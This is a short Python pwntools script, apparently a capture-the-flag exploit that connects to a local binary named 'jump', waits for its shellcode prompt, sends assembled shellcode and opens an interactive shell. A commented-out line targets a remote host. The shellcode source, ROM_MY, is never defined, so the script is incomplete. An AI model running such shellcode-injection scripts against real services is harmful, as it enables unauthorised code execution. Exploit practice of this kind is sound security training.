#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "sh"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16

  # pwnlib.shellcraft.i386.linux.readn(1000, 'eax', 'ebx')

rom = ROM_MY
#print(rom)
rom = asm(rom)

def io_beg():
	return process("./jump")
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("enter your shellcode:".encode(ENCODING), timeout = 3).decode(ENCODING)

def main():
	print("**********WELCOME**********")
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()						
			io_rdy(io)
						
			print("1. Deploying ")
			io.send_raw(rom) # win
			print("2. Fire")
			io.sendline(b'') # fire!		
			
			io.interactive()
			
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
